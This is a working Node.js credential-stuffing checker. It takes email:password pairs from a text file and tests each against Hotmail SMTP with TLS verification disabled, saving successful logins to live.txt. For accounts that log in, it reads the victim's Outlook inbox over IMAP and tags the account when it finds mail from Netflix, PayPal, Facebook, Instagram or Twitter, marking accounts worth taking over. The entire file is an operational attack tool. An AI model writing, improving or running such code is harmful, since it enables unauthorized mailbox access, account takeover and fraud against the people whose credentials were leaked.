const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');
const { ImapFlow } = require('imapflow');

(async () => {
    const chalk = (await import('chalk')).default;

    // Boolean values to enable/disable various filters
    const enableNetflixFilter = false;
    const enablePayPalFilter = false;
    const enableFacebookFilter = true;
    const enableInstagramFilter = false;
    const enableTwitterFilter = false;

    // Function to get the input file name
    const getInputFileName = () => {
        if (fs.existsSync('mails.txt')) {
            return 'mails.txt';
        } else {
            const files = fs.readdirSync('.').filter(file => file.endsWith('.txt') && file !== 'live.txt' && file !== 'dead.txt');
            if (files.length > 0) {
                return files[0];
            } else {
                console.error(chalk.red('No valid input file found.'));
                process.exit(1);
            }
        }
    };

    const inputFileName = getInputFileName();

    // Read the email and passwords from the input file
    fs.readFile(inputFileName, 'utf8', (err, data) => {
        if (err) {
            console.error(chalk.red(`Error reading ${inputFileName} file`));
            return;
        }

        // Log the current date, time, file name, and number of lines
        const currentDate = new Date();
        const logHeader = `Date: ${currentDate.toLocaleString()}\nFile: ${inputFileName}\nNumber of lines: ${data.trim().split('\n').length}\n\n`;

        // Append the log header to live.txt and dead.txt
        fs.appendFileSync('live.txt', logHeader, 'utf8');
        fs.appendFileSync('dead.txt', logHeader, 'utf8');

        console.log(chalk.blue(logHeader));
        console.log(chalk.blue(`Filters - Netflix: ${enableNetflixFilter ? '✅ON' : '❌OFF'}, PayPal: ${enablePayPalFilter ? '✅ON' : '❌OFF'}, Facebook: ${enableFacebookFilter ? '✅ON' : '❌OFF'}, Instagram: ${enableInstagramFilter ? '✅ON' : '❌OFF'}, Twitter: ${enableTwitterFilter ? '✅ON' : '❌OFF'}`));

        const lines = data.trim().split('\n');
        const liveEmails = [];
        const deadEmails = [];

        const checkEmail = async (line, callback) => {
            const [emailAndPass, ...rest] = line.split(' | ');
            const [email, password] = emailAndPass.split(':');

            let transporter = nodemailer.createTransport({
                service: 'hotmail',
                auth: {
                    user: email,
                    pass: password
                },
                tls: {
                    rejectUnauthorized: false
                },
                connectionTimeout: 60000
            });

            transporter.verify(async (error, success) => {
                if (error) {
                    deadEmails.push(emailAndPass);
                    fs.appendFileSync('dead.txt', emailAndPass + '\n', 'utf8');
                    console.log(chalk.red(`❌ 💨 ${email}`));
                } else {
                    liveEmails.push(emailAndPass);
                    fs.appendFileSync('live.txt', emailAndPass + '\n', 'utf8');
                    console.log(chalk.green(`✅ 💨 ${emailAndPass}`));

                    if (enableNetflixFilter || enablePayPalFilter || enableFacebookFilter || enableInstagramFilter || enableTwitterFilter) {

                        const client = new ImapFlow({
                            host: 'outlook.office365.com',
                            port: 993,
                            secure: true,
                            auth: {
                                user: email,
                                pass: password
                            },
                            logger: false
                        });

                        try {
                            await client.connect();
                            await client.mailboxOpen('INBOX');

                            let hasNetflixMail = false;
                            let hasPayPalMail = false;
                            let hasFacebookMail = false;
                            let hasInstagramMail = false;
                            let hasTwitterMail = false;

                            for await (let message of client.fetch('1:*', { envelope: true })) {
                                if (enableNetflixFilter && message.envelope.from.some(from => from.address === 'info@account.netflix.com')) {
                                    hasNetflixMail = true;
                                }
                                if (enablePayPalFilter && message.envelope.from.some(from => from.address === 'service@paypal.com')) {
                                    hasPayPalMail = true;
                                }
                                if (enableFacebookFilter && message.envelope.from.some(from => from.address === 'notification@facebookmail.com')) {
                                    hasFacebookMail = true;
                                }
                                if (enableInstagramFilter && message.envelope.from.some(from => from.address === 'no-reply@mail.instagram.com')) {
                                    hasInstagramMail = true;
                                }
                                if (enableTwitterFilter && message.envelope.from.some(from => from.address === 'info@twitter.com')) {
                                    hasTwitterMail = true;
                                }
                                if (hasNetflixMail && hasPayPalMail && hasFacebookMail && hasInstagramMail && hasTwitterMail) break;
                            }

                            let liveEntry = emailAndPass;
                            if (hasNetflixMail) {
                                liveEntry += ' | Netflix ✅';
                            }
                            if (hasPayPalMail) {
                                liveEntry += ' | PayPal ✅';
                            }
                            if (hasFacebookMail) {
                                liveEntry += ' | Facebook ✅';
                            }
                            if (hasInstagramMail) {
                                liveEntry += ' | Instagram ✅';
                            }
                            if (hasTwitterMail) {
                                liveEntry += ' | Twitter ✅';
                            }
                            fs.appendFileSync('live.txt', liveEntry + '\n', 'utf8');
                            console.log(chalk.green(`Filtered: ${emailAndPass} | Netflix: ${hasNetflixMail ? '✅' : '❌'} | PayPal: ${hasPayPalMail ? '✅' : '❌'} | Facebook: ${hasFacebookMail ? '✅' : '❌'} | Instagram: ${hasInstagramMail ? '✅' : '❌'} | Twitter: ${hasTwitterMail ? '✅' : '❌'}`));

                            await client.logout();
                        } catch (imapError) {
                            console.log(chalk.red(`Failed to fetch emails for: ${email}`));
                        }
                    }
                }
                callback();
            });
        };

        let index = 0;
        const checkNext = () => {
            if (index < lines.length) {
                checkEmail(lines[index], () => {
                    index++;
                    checkNext();
                });
            } else {
                console.log(chalk.blue('Authentication process completed.'));
            }
        };

        checkNext();
    });
})();